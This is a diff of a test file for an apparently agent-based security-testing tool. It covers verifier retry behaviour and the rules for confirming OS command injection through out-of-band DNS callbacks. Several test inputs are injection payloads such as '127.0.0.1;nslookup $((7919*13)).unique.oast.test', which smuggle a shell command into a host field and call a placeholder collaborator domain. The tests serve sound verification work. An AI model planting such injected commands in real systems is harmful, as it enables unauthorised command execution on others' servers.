@@ -1455,6 +1455,69 @@ async def test_text_only_verifier_is_inconclusive(manager, monkeypatch):
     assert not check(manager, cand)
 
 
+@pytest.mark.asyncio
+async def test_verifier_without_verdict_is_retried_once_in_a_fresh_run(manager, monkeypatch):
+    import app.services.agent.fireteam_service as fireteam
+    from app.services.agent.engagement_brain import engagement_brain_from_dict
+    from app.services.agent.evidence_store import verification_run
+    from app.services.agent.independent_verify import (
+        MAX_VERIFIER_ATTEMPTS,
+        run_independent_verifiers,
+    )
+
+    cand = candidate(manager)
+    run_ids = []
+
+    async def silent(*a, **kw):
+        run_ids.append(verification_run.get().id)
+        return fireteam.SpecialistReport(
+            specialist="independent_verifier", role="verifier", mission="",
+            summary="", error="model timeout",
+        )
+
+    monkeypatch.setattr(fireteam, "_run_specialist", silent)
+    result = await run_independent_verifiers([cand], llm=None, tools_manager=manager)
+    assert len(run_ids) == MAX_VERIFIER_ATTEMPTS == 2
+    assert len(set(run_ids)) == 2  # evidence from attempt 1 cannot confirm attempt 2
+    assert result[0]["status"] == "inconclusive"
+    assert result[0]["verifier_attempts"] == 2
+    live = engagement_brain_from_dict(manager._engagement_brain).candidates[0]
+    assert live["proof_gap"]["reason"].startswith("Verifier recorded no verdict after 2 attempts")
+    assert "model timeout" in live["proof_gap"]["reason"]
+    assert live["proof_gap"]["next_step"]
+    assert not check(manager, cand)
+    assert not finding_publish_allowed(
+        manager, title=cand.title, target=cand.target, severity="high"
+    )[0]
+
+
+@pytest.mark.asyncio
+async def test_verifier_retry_stops_once_a_verdict_is_recorded(manager, monkeypatch):
+    import app.services.agent.fireteam_service as fireteam
+    from app.services.agent.engagement_brain import engagement_brain_from_dict
+    from app.services.agent.independent_verify import apply_verdict, run_independent_verifiers
+
+    cand = candidate(manager)
+    calls = []
+
+    async def second_attempt_judges(*a, **kw):
+        calls.append(1)
+        if len(calls) == 2:
+            apply_verdict(manager, candidate_id=cand.id, verdict="inconclusive",
+                          summary="Control response matched baseline",
+                          proof={"next_step": "Replay with a second identity"})
+        return fireteam.SpecialistReport(
+            specialist="independent_verifier", role="verifier", mission="", summary="",
+        )
+
+    monkeypatch.setattr(fireteam, "_run_specialist", second_attempt_judges)
+    result = await run_independent_verifiers([cand], llm=None, tools_manager=manager)
+    assert len(calls) == 2 and result[0]["verifier_attempts"] == 2
+    gap = engagement_brain_from_dict(manager._engagement_brain).candidates[0]["proof_gap"]
+    assert gap == {"reason": "Control response matched baseline",
+                   "next_step": "Replay with a second identity"}
+
+
 def test_artifact_redacts_nested_json_credentials_and_keeps_late_evidence(manager):
     body = json.dumps(
         {
@@ -1699,6 +1762,79 @@ async def test_oob_proof_requires_fresh_registration_plant_and_matching_callback
         assert check(manager, cand)
     finally:
         verification_run.reset(token)
+
+
+async def _command_injection_oob_verdict(manager, transport, host_value, interaction, label):
+    cand = candidate(manager, "OS command injection in diagnostics host")
+    token = verification_run.set(VerificationRun("cmdi-run", cand.id, 1, cand.nonce))
+    transport(lambda req: httpx.Response(200, text="ok"))
+    try:
+        store = evidence_store(manager)
+        reg = store.record(
+            "oob_register",
+            {"session_id": "s", "payload_domain": "unique.oast.test", "reused": False},
+        )
+        plant = await manager._http_exchange("POST", cand.target, body={"host": host_value})
+        poll = store.record("oob_poll", {"session_id": "s", "interactions": [interaction]})
+        proof = {"kind": "oob_callback", "register_id": reg,
+                 "plant_id": plant["evidence_id"], "poll_id": poll}
+        if label is not None:
+            proof["evaluated_label"] = label
+        verdict = apply_verdict(
+            manager, candidate_id=cand.id, verdict="confirmed",
+            evidence="Shell-evaluated label reached the collaborator",
+            evidence_ids=[reg, plant["evidence_id"], poll], proof=proof,
+        )
+        return verdict, check(manager, cand)
+    finally:
+        verification_run.reset(token)
+
+
+@pytest.mark.asyncio
+async def test_command_injection_confirms_with_shell_evaluated_callback_label(manager, transport):
+    verdict, receipt = await _command_injection_oob_verdict(
+        manager, transport, "127.0.0.1;nslookup $((7919*13)).unique.oast.test",
+        {"protocol": "dns", "unique_id": "unique",
+         "raw_request": ";102947.unique.oast.test. IN A"},
+        "102947",
+    )
+    assert verdict.status == "confirmed" and receipt
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("host_value,interaction,label,gap", [
+    # A plain lookup of the canary: a ping feature would do the same.
+    ("unique.oast.test", {"protocol": "dns", "unique_id": "unique",
+                          "raw_request": ";unique.oast.test. IN A"}, None, "evaluated_label"),
+    # The label is in the request, so the callback does not show evaluation.
+    ("x;nslookup $(echo 102947).unique.oast.test",
+     {"protocol": "dns", "unique_id": "unique", "raw_request": ";102947.unique.oast.test. IN A"},
+     "102947", "appears literally"),
+    # No substitution in the plant at all.
+    ("x;nslookup unique.oast.test", {"protocol": "dns", "unique_id": "unique",
+                                     "raw_request": ";102947.unique.oast.test. IN A"},
+     "102947", "substitution"),
+    # Substitution planted, but the callback lacks the computed label.
+    ("x;nslookup $((7919*13)).unique.oast.test",
+     {"protocol": "dns", "unique_id": "unique", "raw_request": ";unique.oast.test. IN A"},
+     "102947", "shell-evaluated label"),
+])
+async def test_command_injection_rejects_callbacks_that_do_not_prove_execution(
+    manager, transport, host_value, interaction, label, gap,
+):
+    verdict, receipt = await _command_injection_oob_verdict(
+        manager, transport, host_value, interaction, label,
+    )
+    assert verdict.status == "inconclusive" and not receipt
+    assert gap in verdict.proof_gap["reason"]
+
+
+def test_command_injection_verifier_mission_explains_evaluated_label():
+    from app.services.agent.independent_verify import FindingCandidate, verifier_mission
+
+    mission = verifier_mission(FindingCandidate(
+        id="c", title="OS command injection in ping", target="https://app.test/ping"))
+    assert "evaluated_label" in mission and "supported proof kinds: oob_callback" in mission
 
 
 @pytest.mark.asyncio
